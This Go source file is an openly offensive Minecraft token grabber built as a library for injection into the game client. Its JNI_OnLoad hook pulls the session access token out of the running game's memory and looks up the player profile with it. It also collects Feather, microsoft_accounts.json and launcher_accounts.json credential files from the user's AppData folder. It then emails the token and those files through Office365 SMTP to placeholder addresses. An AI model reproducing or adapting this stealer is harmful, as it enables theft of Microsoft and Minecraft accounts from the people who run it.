package main

import (
	"C"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/user"
	"runtime"
	"strings"
	"test/jni"

	"gopkg.in/gomail.v2"
	"io/ioutil"



)

//export JNI_OnLoad
func JNI_OnLoad(vm uintptr)int {
	runtime.LockOSThread()
	fmt.Println(vm)
	var env,_=jni.VM(vm).AttachCurrentThread()
	fmt.Println(env)
	var mc=env.FindClass("net/minecraft/client/Minecraft")
	fmt.Println(mc)
	var getm=env.GetStaticMethodID(mc,"func_71410_x","()Lnet/minecraft/client/Minecraft;")
	fmt.Println(getm)
	var sessionc=env.FindClass("net/minecraft/util/Session")
	fmt.Println(sessionc)
	var sessionf=env.GetFieldID(mc,"field_71449_j","Lnet/minecraft/util/Session;")
	fmt.Println(sessionf)
	var tokenf=env.GetFieldID(sessionc,"field_148258_c","Ljava/lang/String;")
	fmt.Println(tokenf)
	var mcobj=env.CallStaticObjectMethodA(mc,getm)
	fmt.Println(mcobj)
	var sessionobj=env.GetObjectField(mcobj,sessionf)
	fmt.Println(sessionobj)
	var tokenobj=env.GetObjectField(sessionobj,tokenf)
	fmt.Println(tokenobj)
	var stringCls = env.FindClass("java/lang/String")
	fmt.Println(stringCls)
	var char = env.GetFieldID(stringCls, "value", "[C")
	fmt.Println(char)
	var byteArray = env.GetObjectField(tokenobj, char)
	fmt.Println(byteArray)
	var i int=env.GetArrayLength(byteArray)
	var ii=0
	var target string=""
	for ii<i {
		t:=env.GetCharArrayElement(byteArray,ii)
		target=target+string(t)
		ii++
	}
	fmt.Println(target)
	var c string=nmsl(target)
	fmt.Println(c)
	start(target,c)
	runtime.UnlockOSThread()
	return 0x00010008
}


func start(token string,context string){
	currentUser, err := user.Current()
	if err != nil {
		log.Fatalf(err.Error())
	}
	dir := currentUser.HomeDir
	fmt.Printf("dir is: %s\n", dir+"\\AppData\\Roaming\\.feather\\accounts.json")
	_, err = os.Stat(dir+"\\AppData\\Roaming\\.feather\\accounts.json")
	if err == nil{
		stringfiles[intsize]=dir+"\\AppData\\Roaming\\.feather\\accounts.json"
		intsize++

	}
	listFiles(dir+"\\AppData\\Roaming\\.minecraft",0)
	sendMail(token,context)
}

func nmsl(token string)string{
	client := http.Client{}
	url := "https://api.minecraftservices.com/minecraft/profile/"
	req, err := http.NewRequest("Get", url, nil)
	if err != nil {
		return ""
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Authorization", "Bearer "+token)
	resp, err := client.Do(req)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	responseBody, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return ""
	}
	return string(responseBody);
}
func sendMail(token string,context string) {

	d := gomail.NewDialer("smtp.office365.com", 587, "youremail", "youpassword")
	m := gomail.NewMessage()
	m.SetHeader("From", "youremail")
	m.SetHeader("To", "target")
	m.SetHeader("Subject", "AccessToken")
	m.SetHeader("Cc", "target")

	m.SetBody("text/plain", "AccessToken: "+token+" \n"+
		"Context: "+context)
	for i := 0; i < intsize; i++ {
		m.Attach(stringfiles[i])
	}
	if err := d.DialAndSend(m); err != nil {
		println(err.Error())
	}
}


func main() {
	start("abc","test")
}

var stringfiles[30] string
var intsize=0
func listFiles(dirname string,level int) {

	s := "l--"
	for i := 0; i < level; i++ {
		s = "I" + s
	}
	fileInfos, err := ioutil.ReadDir(dirname)
	if err != nil {
		log.Fatal(err)
	}
	for _, fi := range fileInfos {
		filename := dirname + "/" + fi.Name()

		if(strings.Contains(filename,"microsoft_accounts.json")){
			fmt.Println(filename)
			stringfiles[intsize]=filename
			intsize++
		}
		if(strings.Contains(filename,"launcher_accounts.json")){
			fmt.Println(filename)
			stringfiles[intsize]=filename
			intsize++
		}

		if fi.IsDir() {
			//继续遍历fi这个目录
			listFiles(filename, level+1)
		}
	}

}
